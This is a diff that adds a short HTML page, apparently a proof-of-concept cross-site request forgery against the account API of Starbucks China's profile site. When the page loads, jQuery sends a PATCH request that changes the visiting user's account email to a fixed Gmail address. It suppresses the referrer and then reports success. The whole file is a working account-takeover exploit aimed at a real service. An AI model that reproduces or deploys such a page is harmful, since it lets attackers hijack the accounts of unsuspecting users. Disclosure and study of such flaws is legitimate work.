@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="referrer" content="never">
+<script src=/jquery-3.4.1.min.js></script>
+</head>
+<title>modify the emails</title>
+<script>
+$.ajax({
+            headers : {
+                'Accept' : 'application/json',
+                'Content-Type' : 'application/json'
+            },
+            url : 'https://profile.starbucks.com.cn/api/account/email',
+            type : 'PATCH',
+            data : "{'email':'esperamier@gmail.com'}",
+            success : function(response, textStatus, jqXhr) {
+                alert("Successfully Patched!Your account's email have been modified!");
+            },
+            error : function(jqXHR, textStatus, errorThrown) {
+                // log the error to the console
+                console.log("The following error occured: " + textStatus, errorThrown);
+            },
+            complete : function() {
+                console.log("complete");
+            }
+        });
+</script>
+</html>
